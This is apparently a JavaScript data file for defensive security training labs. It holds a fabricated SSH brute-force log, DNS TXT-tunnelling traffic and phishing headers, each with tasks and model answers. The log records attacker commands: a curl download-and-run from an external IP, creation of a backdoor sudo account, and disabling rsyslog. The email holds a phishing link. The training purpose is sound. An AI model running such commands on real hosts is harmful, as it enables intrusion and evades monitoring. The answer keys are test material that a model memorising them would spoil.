// Browser labs: a real artifact, and tasks that only make sense if you read it.
//
// kind 'log'   renders line-numbered monospace with a filter
// kind 'table' is CSV with a header row, rendered sortable with a filter
//
// Artifacts are invented but shaped like the real thing: the noise matters as
// much as the signal, because spotting the signal is the whole exercise.

const AUTH_LOG = `Nov 19 01:52:11 web-03 CRON[19842]: pam_unix(cron:session): session opened for user root by (uid=0)
Nov 19 01:52:11 web-03 CRON[19842]: pam_unix(cron:session): session closed for user root
Nov 19 01:58:42 web-03 sshd[20102]: Accepted publickey for deploy from 10.14.3.22 port 51884 ssh2: RSA SHA256:4mCq8vX2pLdKsR7nT1yWbE9zHfJgA3uQ
Nov 19 01:58:42 web-03 systemd-logind[812]: New session 4412 of user deploy.
Nov 19 01:59:03 web-03 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
Nov 19 02:03:17 web-03 sshd[20188]: Received disconnect from 10.14.3.22 port 51884:11: disconnected by user
Nov 19 02:03:17 web-03 systemd-logind[812]: Session 4412 logged out.
Nov 19 02:11:04 web-03 sshd[20391]: Invalid user oracle from 103.84.22.17 port 58812
Nov 19 02:11:04 web-03 sshd[20391]: Failed password for invalid user oracle from 103.84.22.17 port 58812 ssh2
Nov 19 02:11:06 web-03 sshd[20394]: Invalid user postgres from 103.84.22.17 port 58840
Nov 19 02:11:06 web-03 sshd[20394]: Failed password for invalid user postgres from 103.84.22.17 port 58840 ssh2
Nov 19 02:11:09 web-03 sshd[20398]: Invalid user test from 103.84.22.17 port 58866
Nov 19 02:11:09 web-03 sshd[20398]: Failed password for invalid user test from 103.84.22.17 port 58866 ssh2
Nov 19 02:12:44 web-03 sshd[20440]: Failed password for root from 103.84.22.17 port 59002 ssh2
Nov 19 02:12:47 web-03 sshd[20443]: Failed password for root from 103.84.22.17 port 59018 ssh2
Nov 19 02:12:50 web-03 sshd[20447]: Failed password for root from 103.84.22.17 port 59034 ssh2
Nov 19 02:12:53 web-03 sshd[20451]: Failed password for root from 103.84.22.17 port 59050 ssh2
Nov 19 02:12:56 web-03 sshd[20455]: Failed password for root from 103.84.22.17 port 59066 ssh2
Nov 19 02:13:00 web-03 sshd[20459]: error: maximum authentication attempts exceeded for root from 103.84.22.17 port 59082 ssh2 [preauth]
Nov 19 02:13:00 web-03 sshd[20459]: Disconnecting authenticating user root 103.84.22.17 port 59082: Too many authentication failures [preauth]
Nov 19 02:14:07 web-03 sshd[20481]: Failed password for admin from 103.84.22.17 port 59122 ssh2
Nov 19 02:14:09 web-03 sshd[20483]: Failed password for admin from 103.84.22.17 port 59130 ssh2
Nov 19 02:14:11 web-03 sshd[20486]: Failed password for jenkins from 103.84.22.17 port 59141 ssh2
Nov 19 02:14:14 web-03 sshd[20490]: Accepted password for deploy from 103.84.22.17 port 59158 ssh2
Nov 19 02:14:14 web-03 systemd-logind[812]: New session 4418 of user deploy.
Nov 19 02:14:15 web-03 sshd[20490]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Nov 19 02:14:22 web-03 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s -o /tmp/.sysupd http://185.62.189.44/u
Nov 19 02:14:23 web-03 sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1004)
Nov 19 02:14:25 web-03 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/chmod +x /tmp/.sysupd
Nov 19 02:14:28 web-03 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/tmp/.sysupd
Nov 19 02:15:02 web-03 sshd[20512]: Accepted publickey for deploy from 185.62.189.44 port 44112 ssh2: RSA SHA256:9xK2mQ7fLpN4vBtR8wYcE1jHsG5aZ3dU
Nov 19 02:15:02 web-03 systemd-logind[812]: New session 4419 of user deploy.
Nov 19 02:15:40 web-03 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo svc-backup
Nov 19 02:15:41 web-03 useradd[20538]: new user: name=svc-backup, UID=1007, GID=1007, home=/home/svc-backup, shell=/bin/bash
Nov 19 02:15:44 web-03 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/passwd svc-backup
Nov 19 02:16:03 web-03 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl disable --now rsyslog
Nov 19 02:16:31 web-03 sshd[20490]: Received disconnect from 103.84.22.17 port 59158:11: disconnected by user
Nov 19 02:16:31 web-03 systemd-logind[812]: Session 4418 logged out.
Nov 19 02:44:09 web-03 sshd[20771]: Accepted publickey for svc-backup from 185.62.189.44 port 49330 ssh2: RSA SHA256:9xK2mQ7fLpN4vBtR8wYcE1jHsG5aZ3dU
Nov 19 02:44:09 web-03 systemd-logind[812]: New session 4423 of user svc-backup.
Nov 19 06:25:00 web-03 CRON[21402]: pam_unix(cron:session): session opened for user root by (uid=0)
Nov 19 06:25:01 web-03 CRON[21402]: pam_unix(cron:session): session closed for user root
Nov 19 08:02:18 web-03 sshd[21688]: Accepted publickey for deploy from 10.14.3.22 port 53002 ssh2: RSA SHA256:4mCq8vX2pLdKsR7nT1yWbE9zHfJgA3uQ
Nov 19 08:02:18 web-03 systemd-logind[812]: New session 4431 of user deploy.`;

const DNS_CSV = `time,src_host,src_ip,qtype,query,answer_bytes
09:14:02,fin-lap-14,10.14.9.61,A,outlook.office365.com,76
09:14:05,fin-lap-14,10.14.9.61,A,teams.microsoft.com,92
09:14:31,hr-lap-07,10.14.9.22,A,login.microsoftonline.com,88
09:15:00,eng-wks-21,10.14.11.8,A,github.com,64
09:15:12,eng-wks-21,10.14.11.8,A,registry.npmjs.org,70
09:15:44,fin-lap-14,10.14.9.61,TXT,k7gx2mq4.b3n5tzdf1r8w.cdn-sync-eu.net,214
09:16:14,fin-lap-14,10.14.9.61,TXT,p2vr9hc0.m4k7qsxe3y1n.cdn-sync-eu.net,221
09:16:22,hr-lap-07,10.14.9.22,A,www.google.com,58
09:16:44,fin-lap-14,10.14.9.61,TXT,z8wd1fty.r6b2mnpk9v4c.cdn-sync-eu.net,219
09:17:03,eng-wks-21,10.14.11.8,A,api.github.com,64
09:17:14,fin-lap-14,10.14.9.61,TXT,j3nq7xbe.t9c4wzrm2h6k.cdn-sync-eu.net,223
09:17:40,ops-srv-02,10.14.4.11,A,updates.vendor-edr.com,80
09:17:44,fin-lap-14,10.14.9.61,TXT,v5hk8pdc.y2m6btqn4x9r.cdn-sync-eu.net,217
09:18:09,hr-lap-07,10.14.9.22,A,cdn.linkedin.com,72
09:18:14,fin-lap-14,10.14.9.61,TXT,q4tz6wmb.k8n3rvxd7j2p.cdn-sync-eu.net,220
09:18:44,fin-lap-14,10.14.9.61,TXT,b9ck2qrt.w5y7mzpf3n8v.cdn-sync-eu.net,216
09:19:02,eng-wks-21,10.14.11.8,A,objects.githubusercontent.com,96
09:19:14,fin-lap-14,10.14.9.61,TXT,n6pm4vxz.c1r8ktqw9b5y.cdn-sync-eu.net,222
09:19:33,ops-srv-02,10.14.4.11,A,telemetry.vendor-edr.com,84
09:19:44,fin-lap-14,10.14.9.61,TXT,h2wy9btn.q7v4mcrk1z6d.cdn-sync-eu.net,218
09:20:14,fin-lap-14,10.14.9.61,TXT,r8kd3qnm.p9b6wtzx2v4c.cdn-sync-eu.net,224
09:20:27,hr-lap-07,10.14.9.22,A,static.hrportal.co.in,66
09:20:44,fin-lap-14,10.14.9.61,TXT,t5xq7mbw.n2k9rvdp8c3y.cdn-sync-eu.net,215
09:21:14,fin-lap-14,10.14.9.61,TXT,m9vz4cpk.b7t2qwnr6x1h.cdn-sync-eu.net,221
09:21:31,eng-wks-21,10.14.11.8,A,pypi.org,62
09:21:44,fin-lap-14,10.14.9.61,TXT,w3br8tqn.z5m1kvxc9p7d.cdn-sync-eu.net,219
09:22:14,fin-lap-14,10.14.9.61,TXT,c6nk2wzy.v8q4mtbr3x5p.cdn-sync-eu.net,223
09:22:40,ops-srv-02,10.14.4.11,A,ntp.ubuntu.com,54
09:22:44,fin-lap-14,10.14.9.61,TXT,y7pq9mvd.k3n6wzbt1c8r.cdn-sync-eu.net,217
09:23:14,fin-lap-14,10.14.9.61,TXT,d4tw6krn.m9x2qbvz7p5c.cdn-sync-eu.net,220
09:23:52,hr-lap-07,10.14.9.22,A,outlook.office365.com,76
09:24:14,fin-lap-14,10.14.9.61,TXT,g8mc3qxt.r5k9wnbp2v6z.cdn-sync-eu.net,218
09:24:44,fin-lap-14,10.14.9.61,TXT,s2vn7bkq.t6p3mzwc8x1r.cdn-sync-eu.net,222
09:25:06,eng-wks-21,10.14.11.8,A,deb.debian.org,68
09:25:14,fin-lap-14,10.14.9.61,TXT,l9qx4mwt.n7b2kvzr5c3p.cdn-sync-eu.net,216`;

const PHISH_HEADERS = `Return-Path: <billing@acme-payroll-support.com>
Delivered-To: r.menon@northfield.co.in
Received: from mx3.northfield.co.in (mx3.northfield.co.in [103.21.58.12])
        by imap.northfield.co.in with LMTP id 8fK2nQ4xZ1
        for <r.menon@northfield.co.in>; Tue, 18 Nov 2026 14:22:09 +0530
Received: from vps-4411.hostvault-cloud.ru (vps-4411.hostvault-cloud.ru [91.214.76.33])
        by mx3.northfield.co.in (Postfix) with ESMTPS id 3D9F2A1C44
        for <r.menon@northfield.co.in>; Tue, 18 Nov 2026 14:22:07 +0530 (IST)
Authentication-Results: mx3.northfield.co.in;
        spf=fail (sender IP is 91.214.76.33) smtp.mailfrom=acme-payroll-support.com;
        dkim=none (message not signed);
        dmarc=fail (p=quarantine sp=none) header.from=northfield.co.in
Received-SPF: Fail (mx3.northfield.co.in: domain of acme-payroll-support.com
        does not designate 91.214.76.33 as permitted sender)
        client-ip=91.214.76.33; envelope-from=billing@acme-payroll-support.com
From: "Northfield IT Helpdesk" <it-helpdesk@northfield.co.in>
Reply-To: "Northfield IT Helpdesk" <helpdesk.verify@mail-secure-portal.com>
To: "Rohit Menon" <r.menon@northfield.co.in>
Subject: [Action required] Your mailbox will be deactivated in 24 hours
Date: Tue, 18 Nov 2026 14:22:04 +0530
Message-ID: <20261118.144412.8821@acme-payroll-support.com>
X-Mailer: PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)
X-Priority: 1 (Highest)
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="b1_8fK2nQ4xZ1"
X-Originating-IP: [91.214.76.33]

--b1_8fK2nQ4xZ1
Content-Type: text/plain; charset=UTF-8

Dear Rohit Menon,

Our records show your mailbox quota has been exceeded and your account
is scheduled for deactivation within 24 hours. To keep your account
active, verify your credentials using the secure link below.

  https://northfield-co-in.mail-secure-portal.com/verify?u=r.menon

Failure to verify will result in permanent loss of mail data.

Northfield IT Helpdesk
--b1_8fK2nQ4xZ1--`;

export const LABS = [
  {
    slug: 'ssh-brute-to-persistence',
    title: 'Three failures, one success, and then what',
    role: 'soc',
    level: 'fresher',
    is_free: 1,
    artifact_kind: 'log',
    artifact_name: 'auth.log',
    artifact: AUTH_LOG,
    brief:
      'A web server has been handed to you after a monitoring alert about failed SSH logins. The alert closed itself when the failures stopped. You have the day\'s auth.log. Work out whether anything actually happened, and be ready to say what you would do in the next ten minutes.',
    tasks: [
      {
        prompt: 'One external address is responsible for the suspicious activity. Which is it, and when does it first appear?',
        answer:
          '103.84.22.17, first at 02:11:04 trying invalid usernames (oracle, postgres, test). That early block matters: username guessing before password guessing is the shape of an automated scan, not a user mistyping.',
      },
      {
        prompt: 'The attacker eventually gets in. Which account, and why is that more interesting than the root attempts?',
        answer:
          'deploy, at 02:14:14, by password. More interesting than root for two reasons: root was rate-limited out at 02:13:00 so those attempts went nowhere, and deploy normally authenticates by public key from 10.14.3.22. A password login for a key-only account, from an external address, is the actual finding.',
      },
      {
        prompt: 'Name two things done after the login that you would call persistence, and quote the lines.',
        answer:
          'First, a new SSH key for deploy accepted from 185.62.189.44 at 02:15:02, a different address from the one that logged in. Second, useradd creating svc-backup in the sudo group at 02:15:40, which then logs in by key at 02:44:09. Either survives a password reset on deploy, which is why resetting deploy alone would not end this.',
      },
      {
        prompt: 'Something in this log is an attempt to blind you. What, and what does it mean for your investigation?',
        answer:
          'systemctl disable --now rsyslog at 02:16:03. Logging was switched off on the host, so anything after that point is missing locally and you cannot treat the end of this file as the end of the activity. Pull the same window from the central log collector, and if nothing was being forwarded, say plainly that the timeline has a hole rather than assuming it ends here.',
      },
      {
        prompt: 'Is this a breach, and what do you do in the next ten minutes?',
        answer:
          'Yes: an external address authenticated successfully, escalated to root, ran a downloaded binary and created an account. In ten minutes: isolate the host at the network level while keeping your access, block 185.62.189.44 and 103.84.22.17 at the egress and ingress points, disable deploy and svc-backup rather than deleting them, and preserve the disk and memory before anyone reboots. Then tell the business which host and what it can no longer do.',
      },
    ],
  },

  {
    slug: 'dns-txt-exfil',
    title: 'Something is talking in TXT records',
    role: 'network',
    level: 'mid',
    is_free: 1,
    artifact_kind: 'table',
    artifact_name: 'dns-queries-0914-0925.csv',
    artifact: DNS_CSV,
    brief:
      'Eleven minutes of resolver logs from a single office subnet, pulled because the weekly report flagged an unusual query mix. Nobody has complained and nothing is down. Find what is wrong with it, and decide what you would do without causing an outage.',
    tasks: [
      {
        prompt: 'One host stands out. Which, and name the three properties of its traffic that make it stand out.',
        answer:
          'fin-lap-14 at 10.14.9.61. Three properties: every one of its queries is TXT while every other host asks for A records; the queries land roughly every thirty seconds with very little drift, which is a machine not a person; and the labels are long and high-entropy rather than readable names. Any one alone is weak. Together they are the signature.',
      },
      {
        prompt: 'The domain is cdn-sync-eu.net, which sounds like infrastructure. Does that make it less suspicious?',
        answer:
          'No, and the name is doing exactly the work it was chosen to do. Anyone can register a plausible-sounding domain, and the point of a name like that is to survive a quick glance at a log. Judge it on behaviour, on when the domain was registered, and on which process is asking, not on whether the string sounds like a CDN.',
      },
      {
        prompt: 'What technique is this, and what tells you the direction of the data?',
        answer:
          'DNS tunnelling for exfiltration. The data travels out in the query labels, which is why they are long and random-looking, and the answers come back as TXT records around 215 to 225 bytes, which is consistent enough to be a protocol rather than a varied set of real records. Sustained small two-way volume at a fixed interval is a channel, not lookups.',
      },
      {
        prompt: 'How would you confirm it is exfiltration rather than a misconfigured security or telemetry agent?',
        answer:
          'Go to the host and find the process making the queries, which settles it faster than any amount of log analysis. Compare with ops-srv-02 in the same file: that one queries its vendor by a readable name for A records, which is what legitimate telemetry looks like. Also check whether any other host in the estate talks to this domain. A single host alone is a compromise, not a deployment.',
      },
      {
        prompt: 'What do you block, and what is the risk of the block you chose?',
        answer:
          'Sinkhole cdn-sync-eu.net at the resolver and isolate fin-lap-14. The risk is narrow and acceptable: if you are wrong you break one tool on one laptop and hear about it within minutes. Blocking TXT records generally, or the resolver itself, would be an outage you caused while chasing a maybe. Sinkhole rather than drop, so you keep seeing which hosts try to reach it.',
      },
    ],
  },

  {
    slug: 'phish-header-read',
    title: 'Read the headers, not the signature',
    role: 'soc',
    level: 'fresher',
    is_free: 0,
    artifact_kind: 'log',
    artifact_name: 'reported-message.eml',
    artifact: PHISH_HEADERS,
    brief:
      'A user forwarded this to the security mailbox saying it looked odd. Another user on the same floor has already clicked. Read the headers and be ready to answer the question the service desk will ask you in a minute: is it real, and what do we do now.',
    tasks: [
      {
        prompt: 'Does this message come from who it claims to? Point at the specific headers that decide it.',
        answer:
          'No. The From header says it-helpdesk@northfield.co.in, but Authentication-Results reports spf=fail, dkim=none and dmarc=fail for header.from=northfield.co.in. The From header is display text that anyone can set; the authentication results are the check. Those three lines together are the answer.',
      },
      {
        prompt: 'If the user hits reply, where does the mail actually go, and why does the envelope differ again?',
        answer:
          'To helpdesk.verify@mail-secure-portal.com, from the Reply-To header, not to the address shown in From. Return-Path is different again, billing@acme-payroll-support.com, which is where bounces go. Three different addresses in one message, each serving a different purpose for the sender, is itself a strong indicator.',
      },
      {
        prompt: 'What does the Received chain tell you about where this was actually sent from?',
        answer:
          'Read it bottom up, because each hop prepends itself. The earliest hop you can trust is your own edge, mx3.northfield.co.in, which received it from 91.214.76.33, a hosting provider VPS. A message claiming to be from internal IT should have originated inside the estate or from the sanctioned mail provider, not a rented VPS. X-Originating-IP agrees, but trust the Received line your own server wrote, not a header the sender supplied.',
      },
      {
        prompt: 'The link is northfield-co-in.mail-secure-portal.com. Explain to a non-technical user why that is not your domain.',
        answer:
          'The domain is only ever what sits immediately to the left of the final .com: here that is mail-secure-portal. Everything before it is a subdomain the attacker can name anything, including your company with the dots swapped for hyphens so it reads right at a glance. Teach people to read from the right-hand end, and stop teaching the padlock as a safety signal, because that site will have a valid certificate.',
      },
      {
        prompt: 'A user on the same floor entered their credentials. What are your first three actions?',
        answer:
          'Reset the password and invalidate active sessions and tokens, because resetting alone leaves a live session in the attacker\'s browser. Check the mailbox for rules created after the click, which is the usual first move after a mailbox compromise, and look for sent items you did not expect. Then search the mail platform for other recipients by sender, originating address and URL rather than exact subject, and report delivered against clicked, because that is the number the business will ask for.',
      },
    ],
  },
];
